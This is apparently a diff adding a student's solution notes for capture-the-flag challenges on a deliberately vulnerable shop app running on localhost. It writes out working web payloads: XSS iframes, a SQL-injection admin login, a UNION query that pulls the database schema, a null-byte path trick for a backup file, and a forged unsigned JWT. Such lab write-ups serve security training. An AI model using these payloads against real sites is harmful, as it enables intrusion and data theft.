@@ -1,0 +1,50 @@
+Cyber Security Competition
+
+Key: # Challenge Title, ? Question, ! Answer, $ Bonus
+
+# Score Board
+? Find the carefully hidden 'Score Board' page. 
+! Go to <host>/#/score-board
+
+# DOM XSS (25p).
+? Perform a DOM XSS attack with <iframe src="javascript:alert(`xss`)">
+! Simply put the payload into the search bar.
+$ Can check in Developer Tools to see the XSS in the source. 
+
+# Reflected XSS (50p).
+? Perform a reflected XSS attack with <iframe src="javascript:alert(`xss`)">.
+! Login use ADMIN! it already has address and credit card. 
+! Buy an item
+! Go to the track order
+! Replace the x in <host>/#/track-result/new?id=x
+$
+# Login Admin (50p).
+? Log in with the administrator's user account.
+! admin' or 1=1 -- as the username
+$ Can use sqlXXX
+# Captcha Bypass (75p).
+? Submit 10 or more customer feedbacks within 20 seconds.
+! Submit 1 customer feedback find it on HTTP History send to repeater and send a bunch of times. 
+$
+# Database Schema (75p).
+? Exfiltrate the entire DB schema definition via SQL Injection.
+! Go to search bar and input this: apple'))%20UNION%20SELECT%20sql,2,3,4,5,6,7,8,9%20FROM%20sqlite_master--
+$
+# Forgotten Developer Backup (100p).
+? Access a developer's forgotten backup file.
+! Go to Developer Tools and search for paths
+! go to /ftp
+! localhost:3000/ftp/package.json.bak%00.md
+! Go to BURPSUITE Decoder and put the %00 and encode as URL
+! %25%30%30
+! http://localhost:3000/ftp/package.json.bak%25%30%30.md
+! View the downloaded file
+$
+# Unsigned JWT (125p).
+? Forge an essentially unsigned JWT token that impersonates the (non-existing) user jwtn3d@juice-sh.op.
+! Use JWT.io to seperate
+! paste header and body into seperately base64.guru
+! change header to not use an algorithm "alg": "none"
+! delete = and add . in between and at the end.
+ ! ew0KICAidHlwIjogIkpXVCIsDQogICJhbGciOiAibm9uZSINCn0.ew0KICAic3RhdHVzIjogInN1Y2Nlc3MiLA0KICAiZGF0YSI6IHsNCiAgICAiaWQiOiA0MiwNCiAgICAidXNlcm5hbWUiOiAiand0bjNkIiwNCiAgICAiZW1haWwiOiAiand0bjNkQGp1aWNlLXNoLm9wIiwNCiAgICAicGFzc3dvcmQiOiAiIiwNCiAgICAicm9sZSI6ICJhZG1pbiIsDQogICAgImRlbHV4ZVRva2VuIjogIiIsDQogICAgImxhc3RMb2dpbklwIjogIiIsDQogICAgInByb2ZpbGVJbWFnZSI6ICJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLA0KICAgICJ0b3RwU2VjcmV0IjogIiIsDQogICAgImlzQWN0aXZlIjogdHJ1ZSwNCiAgICAiY3JlYXRlZEF0IjogIjIwMjMtMDMtMzAgMTM6NTI6MzguMDMwICswMDowMCIsDQogICAgInVwZGF0ZWRBdCI6ICIyMDIzLTAzLTMwIDEzOjUyOjM4LjAzMCArMDA6MDAiLA0KICAgICJkZWxldGVkQXQiOiBudWxsDQogIH0sDQogICJpYXQiOiAxNjgwMTg0NzQ1LA0KICAiZXhwIjogMTY4MDIwMjc0NQ0KfQ.
+$
